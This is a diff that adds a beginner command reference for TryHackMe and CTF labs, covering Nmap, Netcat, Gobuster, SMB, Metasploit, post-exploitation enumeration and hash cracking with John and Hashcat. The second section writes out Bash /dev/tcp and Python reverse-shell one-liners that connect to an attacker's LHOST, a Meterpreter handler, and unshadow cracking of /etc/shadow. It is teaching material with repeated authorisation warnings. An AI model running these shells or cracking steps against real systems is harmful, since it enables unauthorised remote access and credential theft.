@@ -1,0 +1,1035 @@
+# Beginner Cybersecurity Command Reference
+
+## Before you start
+
+```bash
+ip a
+```
+
+Shows your network interfaces. On TryHackMe, `tun0` should appear when the VPN is connected.
+
+```bash
+ping -c 3 TARGET
+```
+
+Sends three connection checks. No reply does not always mean the target is down; some machines block ping.
+
+---
+
+# 1. Nmap — Find open doors/services
+
+Start with this:
+
+```bash
+nmap -sV -sC -oN nmap-initial.txt TARGET
+```
+
+What it does:
+
+- `-sV` identifies service versions.
+- `-sC` runs safe default scripts.
+- `-oN nmap-initial.txt` saves the results to a readable file.
+- `TARGET` is the TryHackMe room IP.
+
+To check every TCP port:
+
+```bash
+nmap -p- -T4 -oN nmap-all-ports.txt TARGET
+```
+
+- `-p-` checks ports 1–65535.
+- `-T4` makes the scan faster for a lab.
+- Use the open ports you find in a second scan:
+
+```bash
+nmap -sV -sC -p 22,80,445 TARGET
+```
+
+---
+
+# 2. Ncat / Netcat — Test one port or connect to a service
+
+First, see which version you have:
+
+```bash
+which ncat
+which nc
+```
+
+Check whether one port is open:
+
+```bash
+ncat -vz TARGET 80
+```
+
+- `-v` means verbose: show details.
+- `-z` means scan without sending normal data.
+- `80` is the port to test.
+
+Connect to a text-based service in an authorised lab:
+
+```bash
+ncat TARGET 80
+```
+
+Exit with `Ctrl + C`.
+
+A listening terminal for an authorised TryHackMe reverse-shell task:
+
+```bash
+nc -lvnp 4444
+```
+
+- `-l` listens for a connection.
+- `-v` shows details.
+- `-n` avoids DNS lookups.
+- `-p 4444` uses port 4444.
+
+Only use a listener when the room explicitly tells you to create one.
+
+---
+
+# 3. Socat — A more flexible network connector
+
+Connect your terminal to a service:
+
+```bash
+socat - TCP:TARGET:PORT
+```
+
+Replace `PORT` with a discovered port, for example `8080`.
+
+Example:
+
+```bash
+socat - TCP:TARGET:8080
+```
+
+Think of Socat as a more advanced version of Netcat. You do not need it for every room.
+
+---
+
+# 4. Gobuster — Find website folders and files
+
+Use this only after Nmap shows a web port, such as 80 or 8080.
+
+```bash
+gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
+```
+
+- `dir` means search for directories.
+- `-u` is the target website.
+- `-w` selects the wordlist.
+- `-o` saves results.
+
+To check common file extensions too:
+
+```bash
+gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+```
+
+---
+
+# 5. Curl — Inspect a web server from Terminal
+
+Get only the response headers:
+
+```bash
+curl -I http://TARGET
+```
+
+View a page’s source code:
+
+```bash
+curl http://TARGET
+```
+
+Save a webpage locally:
+
+```bash
+curl http://TARGET -o page.html
+```
+
+---
+
+# 6. WhatWeb — Identify website technology
+
+```bash
+whatweb http://TARGET
+```
+
+It may identify the web server, framework, cookies, or other visible technology.
+
+---
+
+# 7. SMB — Windows file sharing
+
+First, list available shares:
+
+```bash
+smbclient -L //TARGET -N
+```
+
+- `-L` lists shares.
+- `-N` means try without a password.
+
+Connect to an accessible share:
+
+```bash
+smbclient //TARGET/SHARENAME -N
+```
+
+Inside `smbclient`, useful commands are:
+
+```text
+ls
+cd foldername
+get filename
+exit
+```
+
+Only access shares that belong to the authorised lab target.
+
+---
+
+# 8. FTP — File-transfer service
+
+Connect:
+
+```bash
+ftp TARGET
+```
+
+If the room states anonymous login is permitted:
+
+```text
+Username: anonymous
+Password: anonymous
+```
+
+Useful FTP commands:
+
+```text
+ls
+cd foldername
+get filename
+put filename
+bye
+```
+
+---
+
+# 9. SSH — Secure remote terminal access
+
+Use only credentials provided or discovered in the authorised room:
+
+```bash
+ssh username@TARGET
+```
+
+If a non-default SSH port is used:
+
+```bash
+ssh username@TARGET -p PORT
+```
+
+Example:
+
+```bash
+ssh admin@TARGET -p 2222
+```
+
+---
+
+# 10. Metasploit — Security testing framework
+
+Start it:
+
+```bash
+msfconsole
+```
+
+Basic navigation inside Metasploit:
+
+```text
+search keyword
+use module-name
+show options
+set RHOSTS TARGET
+run
+back
+exit
+```
+
+Example of searching for scanner modules:
+
+```text
+search type:auxiliary scanner
+```
+
+Use Metasploit only when the TryHackMe room asks for it or when you understand the module and its effect. Read `show options` before running anything.
+
+---
+
+# 11. Wireshark — Packet analysis
+
+Useful display filters:
+
+```text
+dns
+tcp
+udp
+tls
+quic
+http
+tcp.port == 445
+ip.addr == TARGET
+```
+
+Examples:
+
+- `dns` shows name lookups.
+- `tls` shows encrypted web connections.
+- `tcp.port == 445` shows SMB traffic.
+- `ip.addr == TARGET` limits packets to one lab IP.
+
+---
+
+# 12. Linux commands you will use often
+
+```bash
+ls -la
+```
+
+Lists files, including hidden files.
+
+```bash
+pwd
+```
+
+Shows your current folder.
+
+```bash
+cd foldername
+```
+
+Moves into a folder.
+
+```bash
+cat filename
+```
+
+Reads a small text file.
+
+```bash
+file filename
+```
+
+Identifies a file type.
+
+```bash
+strings filename
+```
+
+Extracts readable text from a file.
+
+```bash
+grep -R "word" .
+```
+
+Searches files in the current folder for a word.
+
+```bash
+find / -name "filename" 2>/dev/null
+```
+
+Searches for a file while hiding permission-error messages.
+
+```bash
+chmod +x filename
+```
+
+Makes a script executable.
+
+---
+
+# A simple room workflow
+
+1. Start the TryHackMe machine.
+2. Note the assigned target IP.
+3. Run:
+
+```bash
+nmap -sV -sC -oN nmap-initial.txt TARGET
+```
+
+4. Read the open ports.
+5. Choose the correct next tool:
+
+```text
+Web port found → browser, curl, WhatWeb, Gobuster
+SMB found → smbclient
+FTP found → ftp
+SSH found → ssh (only with valid credentials)
+Packet capture supplied → Wireshark
+```
+# CTF Command Reference — Part 2
+
+## Reverse-shell listeners
+
+Use a listener only when an authorised lab task requires a callback.
+
+### Netcat
+
+```bash
+nc -lvnp 4444
+```
+
+Listens on port `4444`.
+
+### Ncat
+
+```bash
+ncat -lvnp 4444
+```
+
+Same idea, using Nmap’s Ncat tool.
+
+### Netcat with better interaction
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+`rlwrap` gives better command history and arrow-key support.
+
+### Socat listener
+
+```bash
+socat TCP-LISTEN:4444,reuseaddr,fork -
+```
+
+Socat is useful when Netcat does not behave as expected.
+
+---
+
+## Reverse-shell basics
+
+A reverse shell means the **target machine connects back to your Kali listener**.
+
+Your listener must be started first:
+
+```bash
+nc -lvnp 4444
+```
+
+Your `LHOST` should be your `tun0` address:
+
+```bash
+ip a show tun0
+```
+
+Example Bash reverse shell for an authorised Linux lab:
+
+```bash
+bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
+```
+
+Example Python reverse shell for an authorised Linux lab:
+
+```bash
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+```
+
+Replace `LHOST` with your own TryHackMe VPN address.
+
+---
+
+## Improve an unstable shell
+
+On the target:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Then press `Ctrl + Z` on Kali and run:
+
+```bash
+stty raw -echo; fg
+```
+
+Then press Enter and run:
+
+```bash
+export TERM=xterm
+```
+
+This often improves command history, tab completion, and interactive programs.
+
+---
+
+## Metasploit
+
+Start Metasploit:
+
+```bash
+msfconsole -q
+```
+
+Useful commands inside Metasploit:
+
+```text
+search keyword
+info
+use module-name
+show options
+set RHOSTS TARGET
+set RPORT PORT
+set LHOST YOUR-TUN0-IP
+set LPORT 4444
+check
+run
+back
+exit
+```
+
+### Generic listener with Metasploit
+
+```text
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST YOUR-TUN0-IP
+set LPORT 4444
+run
+```
+
+Useful session commands:
+
+```text
+sessions -l
+sessions -i 1
+background
+```
+
+- `sessions -l` lists active sessions.
+- `sessions -i 1` enters session number 1.
+- `background` returns to Metasploit without closing a session.
+
+Always read module information first:
+
+```text
+info
+```
+
+---
+
+## FFUF — Fast web discovery
+
+Find folders and files:
+
+```bash
+ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
+```
+
+- `FUZZ` is where FFUF inserts words.
+- `-fc 404` hides normal “not found” pages.
+
+Check common extensions:
+
+```bash
+ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt -fc 404
+```
+
+Look for virtual hosts in an authorised lab:
+
+```bash
+ffuf -u http://TARGET -H "Host: FUZZ.target.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
+```
+
+---
+
+## Feroxbuster — Website content discovery
+
+```bash
+feroxbuster -u http://TARGET
+```
+
+Specify extensions:
+
+```bash
+feroxbuster -u http://TARGET -x php,html,txt
+```
+
+Save findings:
+
+```bash
+feroxbuster -u http://TARGET -o feroxbuster.txt
+```
+
+Use either Feroxbuster, Gobuster, or FFUF at first. You do not need all three every time.
+
+---
+
+## Nikto — Basic web-server checks
+
+```bash
+nikto -h http://TARGET
+```
+
+Nikto looks for common exposed files, server misconfigurations, and known web-server issues. It can be noisy, so use it only against an authorised lab.
+
+---
+
+## SMB enumeration
+
+Detailed SMB information:
+
+```bash
+enum4linux-ng -A TARGET
+```
+
+List shares:
+
+```bash
+smbclient -L //TARGET -N
+```
+
+Check share permissions:
+
+```bash
+smbmap -H TARGET
+```
+
+Connect to a share:
+
+```bash
+smbclient //TARGET/SHARENAME -N
+```
+
+---
+
+## Nmap scripts
+
+Web-focused scripts:
+
+```bash
+nmap -p 80,443 --script http-title,http-headers,http-enum TARGET
+```
+
+SMB-focused scripts:
+
+```bash
+nmap -p 445 --script smb-os-discovery,smb-enum-shares TARGET
+```
+
+Safe discovery scripts:
+
+```bash
+nmap -sV --script safe,discovery TARGET
+```
+
+---
+
+## DNS enumeration
+
+```bash
+dig TARGET-DOMAIN
+```
+
+Get DNS records:
+
+```bash
+dig TARGET-DOMAIN A
+dig TARGET-DOMAIN MX
+dig TARGET-DOMAIN TXT
+```
+
+Alternative tool:
+
+```bash
+nslookup TARGET-DOMAIN
+```
+
+---
+
+## SNMP enumeration
+
+Only use when Nmap reveals UDP port 161:
+
+```bash
+snmpwalk -v2c -c public TARGET
+```
+
+This tries the common lab community string `public`.
+
+---
+
+## Hash identification and password recovery
+
+Identify a hash type:
+
+```bash
+hashid hash.txt
+```
+
+Try a wordlist against an authorised lab hash:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+Show recovered results:
+
+```bash
+john --show hash.txt
+```
+
+Never use password-recovery tools against accounts or data you do not own or have permission to test.
+
+---
+
+## File transfer in a lab
+
+On Kali, share the current folder:
+
+```bash
+python3 -m http.server 8000
+```
+
+From an authorised Linux target, download a file:
+
+```bash
+wget http://LHOST:8000/filename
+```
+
+Or:
+
+```bash
+curl http://LHOST:8000/filename -o filename
+```
+
+Stop the Python server with `Ctrl + C`.
+
+---
+
+## Useful post-enumeration commands
+
+```bash
+whoami
+```
+
+Shows the current user.
+
+```bash
+id
+```
+
+Shows user and group permissions.
+
+```bash
+hostname
+```
+
+Shows the machine name.
+
+```bash
+uname -a
+```
+
+Shows kernel and operating-system information.
+
+```bash
+sudo -l
+```
+
+Shows commands the current user can run with elevated privileges.
+
+```bash
+ss -tulpn
+```
+
+Shows listening network services.
+
+```bash
+ps aux
+```
+
+Shows running processes.
+
+```bash
+crontab -l
+```
+
+Shows scheduled tasks for the current user.
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Finds SUID files on an authorised Linux lab machine.
+
+---
+
+## A practical workflow
+
+```text
+1. Connect to the TryHackMe VPN.
+2. Start the room machine.
+3. Run Nmap.
+4. Read the results before launching more tools.
+5. Enumerate the specific service you found.
+6. Document every useful clue.
+7. Use a listener only when the lab requires a callback.
+8. Record the remediation or security lesson after the lab.
+```# Hash Cracking: Beginner-to-CTF Reference
+
+## First: identify the hash
+
+```bash
+hashid hash.txt
+```
+
+This guesses the hash type.
+
+Common examples:
+
+```text
+d41d8cd98f00b204e9800998ecf8427e  → likely MD5
+5baa61e4c9b93f3f0682250b6cf8331b → likely SHA-1
+aad3b435b51404eeaad3b435b51404ee → LM / NTLM-related format
+```
+
+A hash is not automatically a password hash. It may simply be a file checksum.
+
+---
+
+## Get the RockYou wordlist
+
+Kali often stores it compressed.
+
+```bash
+zcat /usr/share/wordlists/rockyou.txt.gz > ~/rockyou.txt
+```
+
+This creates a usable copy in your home folder.
+
+---
+
+# John the Ripper
+
+## Basic wordlist attack
+
+```bash
+john --wordlist=~/rockyou.txt hash.txt
+```
+
+John tries each password from the wordlist.
+
+## Show cracked passwords
+
+```bash
+john --show hash.txt
+```
+
+## Specify a hash format
+
+```bash
+john --format=raw-md5 --wordlist=~/rockyou.txt hash.txt
+```
+
+Useful John formats:
+
+```text
+raw-md5       → MD5
+raw-sha1      → SHA-1
+nt            → NTLM
+sha512crypt   → Linux SHA-512 password hashes
+bcrypt        → bcrypt hashes
+```
+
+Example for NTLM:
+
+```bash
+john --format=nt --wordlist=~/rockyou.txt hash.txt
+```
+
+---
+
+# Hashcat
+
+## Basic format
+
+```bash
+hashcat -m MODE -a ATTACK-MODE hash.txt ~/rockyou.txt
+```
+
+- `-m` chooses the hash type.
+- `-a 0` means dictionary/wordlist attack.
+- `hash.txt` contains the hash.
+- `~/rockyou.txt` is the wordlist.
+
+## Common Hashcat modes
+
+```text
+0       → MD5
+100     → SHA-1
+1000    → NTLM
+1400    → SHA-256
+1800    → sha512crypt
+3200    → bcrypt
+```
+
+## MD5 example
+
+```bash
+hashcat -m 0 -a 0 hash.txt ~/rockyou.txt
+```
+
+## NTLM example
+
+```bash
+hashcat -m 1000 -a 0 hash.txt ~/rockyou.txt
+```
+
+## Show cracked results
+
+```bash
+hashcat -m 1000 hash.txt --show
+```
+
+Use the same mode you used while cracking.
+
+---
+
+# Password rules
+
+Rules modify each word in a wordlist. For example, they can add numbers or capital letters.
+
+```bash
+hashcat -m 0 -a 0 hash.txt ~/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+This is helpful when a password may be based on a common word but changed slightly, such as:
+
+```text
+password → Password1
+football → football123
+admin → Admin!
+```
+
+---
+
+# Mask attacks
+
+A mask attack tries a pattern when you know something about the password.
+
+```bash
+hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d?d
+```
+
+This means:
+
+```text
+One uppercase letter
+Three lowercase letters
+Three numbers
+```
+
+Example candidates:
+
+```text
+Test123
+John456
+Pass999
+```
+
+Useful mask symbols:
+
+```text
+?l  lowercase letter
+?u  uppercase letter
+?d  number
+?s  special character
+?a  all characters
+```
+
+---
+
+# Cracking ZIP archives
+
+Extract a crackable hash:
+
+```bash
+zip2john archive.zip > zip.hash
+```
+
+Crack it:
+
+```bash
+john --wordlist=~/rockyou.txt zip.hash
+```
+
+Show the result:
+
+```bash
+john --show zip.hash
+```
+
+---
+
+# Cracking SSH private-key passphrases
+
+```bash
+ssh2john.py id_rsa > ssh.hash
+john --wordlist=~/rockyou.txt ssh.hash
+```
+
+If `ssh2john.py` is not found:
+
+```bash
+locate ssh2john
+```
+
+---
+
+# Cracking PDF passwords
+
+```bash
+pdf2john.pl document.pdf > pdf.hash
+john --wordlist=~/rockyou.txt pdf.hash
+```
+
+---
+
+# Cracking Linux password hashes in a lab
+
+When an authorised lab provides `/etc/passwd` and `/etc/shadow`:
+
+```bash
+unshadow passwd shadow > linux.hash
+john --wordlist=~/rockyou.txt linux.hash
+john --show linux.hash
+```
+
+Never copy password-hash files from a system you do not own or lack permission to test.
+
+---
+
+# Quick workflow
+
+```text
+1. Save the hash or protected-file hash to a file.
+2. Use hashid to identify the type.
+3. Try John with RockYou.
+4. Try Hashcat with the correct mode.
+5. Use a rule if the basic wordlist fails.
+6. Use a mask only when you know the likely password pattern.
+7. Record the result and why the password was weak.
+```
+
+## Avoid online hash-cracking websites
+
+Do not upload unknown hashes to public “hash crackers.” You may expose private credentials or sensitive data. Use local tools in your authorised lab instead.
+  The important mindset: Hashcat needs the correct mode; John often detects formats automatically. Start with John, then use Hashcat when you know the hash type or need more control.
+Next, we can do a full section on web enumeration and Burp Suite, then a separate Windows/Active Directory section—one topic at a time, properly.
